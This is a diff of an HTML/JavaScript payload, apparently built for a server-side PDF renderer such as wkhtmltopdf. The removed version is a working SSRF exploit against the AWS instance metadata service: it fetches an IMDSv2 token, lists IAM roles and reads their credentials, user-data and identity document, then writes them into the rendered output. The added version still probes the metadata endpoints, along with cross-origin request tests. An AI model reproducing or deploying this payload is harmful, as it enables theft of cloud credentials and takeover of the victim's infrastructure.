@@ -1,49 +1,24 @@
-<!DOCTYPE html>
-<html><head><meta charset="utf-8">
-<style>body{font-size:8px;font-family:monospace;word-break:break-all;white-space:pre-wrap;}</style>
-</head>
-<body>
-<div id="o">EXPLOIT_START</div>
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<style>body{font-size:8px;font-family:monospace;white-space:pre-wrap;word-break:break-all}</style></head>
+<body><div id="o">DIAG_START</div>
 <script>
 var o=document.getElementById('o');
-function w(t){ o.appendChild(document.createTextNode("\n"+t)); }
-var IP="http://169.254.169.254";
-
-// synchronous XHR so wkhtmltopdf renders AFTER results are in the DOM
-function req(method,url,hdr){
+function w(t){o.appendChild(document.createTextNode("\n"+t));}
+function test(name,method,url,hdr){
   try{
     var x=new XMLHttpRequest();
     x.open(method,url,false);
     if(hdr){for(var k in hdr){try{x.setRequestHeader(k,hdr[k]);}catch(e){}}}
     x.send();
-    return {s:x.status, b:x.responseText};
-  }catch(e){ return {s:-1, b:"JS_ERR:"+e}; }
+    w(name+" OK ["+x.status+"] len="+(x.responseText?x.responseText.length:0)+" :: "+(x.responseText||"").slice(0,120));
+  }catch(e){ w(name+" ERR "+e); }
 }
-
-// 1) try IMDSv1 (in case both are allowed) -- diagnostic
-var v1 = req("GET", IP+"/latest/meta-data/iam/security-credentials/", null);
-w("V1_ROLES ["+v1.s+"]: "+v1.b);
-
-// 2) IMDSv2: PUT to get a token
-var tk = req("PUT", IP+"/latest/api/token", {"X-aws-ec2-metadata-token-ttl-seconds":"21600"});
-w("TOKEN ["+tk.s+"]: "+tk.b);
-var token = (tk.s>=200 && tk.s<300) ? tk.b : "";
-
-var H = {"X-aws-ec2-metadata-token": token};
-
-// 3) enumerate + drain
-var roles = req("GET", IP+"/latest/meta-data/iam/security-credentials/", H);
-w("ROLES ["+roles.s+"]: "+roles.b);
-
-if(roles.s>=200 && roles.s<300 && roles.b){
-  var role = roles.b.split("\n")[0].split(",")[0].trim();
-  var creds = req("GET", IP+"/latest/meta-data/iam/security-credentials/"+role, H);
-  w("CREDS("+role+") ["+creds.s+"]: "+creds.b);
-}
-
-// 4) other juicy endpoints
-w("USERDATA "+JSON.stringify(req("GET", IP+"/latest/user-data", H)));
-w("IDDOC "+JSON.stringify(req("GET", IP+"/latest/dynamic/instance-identity/document", H)));
-w("EXPLOIT_END");
-</script>
-</body></html>
+w("origin="+location.href);
+test("A_SELF_sameorigin","GET",location.href,null);
+test("B_XO_https_CORS","GET","https://api.github.com/zen",null);
+test("C_XO_https_noCORS","GET","https://example.com/",null);
+test("D_XO_http_mixed","GET","http://example.com/",null);
+test("E_IMDS_http_GET","GET","http://169.254.169.254/",null);
+test("F_IMDS_http_PUT","PUT","http://169.254.169.254/latest/api/token",{"X-aws-ec2-metadata-token-ttl-seconds":"21600"});
+w("DIAG_END");
+</script></body></html>
